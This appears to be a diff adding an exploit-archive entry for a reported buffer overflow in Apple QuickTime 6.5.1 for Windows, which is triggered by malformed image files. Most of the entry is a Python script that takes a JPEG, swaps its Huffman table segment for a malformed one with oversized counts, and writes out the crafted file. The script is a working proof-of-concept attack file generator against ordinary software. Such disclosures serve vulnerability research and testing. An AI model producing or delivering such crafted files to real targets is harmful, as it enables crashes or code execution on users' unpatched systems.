@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/12905/info
+
+Apple QuickTime is reportedly prone to a buffer overflow when viewing malformed image files.
+
+This issue was reported to exist in QuickTime 6.5.1 for Windows. Other versions may also be affected.
+
+import struct
+f=open(raw_input("enter the path to the input file:\n"),"rb")
+a=f.read()
+f.close()
+n=a.index("\xff\xc4")
+b=a[:n]+"\xff\xc4\x02\x11\x00\xff\xff"+"\x00"*14+"\x01"*510
++a[n+2+struct.unpack("!H",a[n+2:n+4])[0]:]
+f=open(raw_input("enter the path to the output file:\n"),"wb")
+f.write(b)
+f.close() 
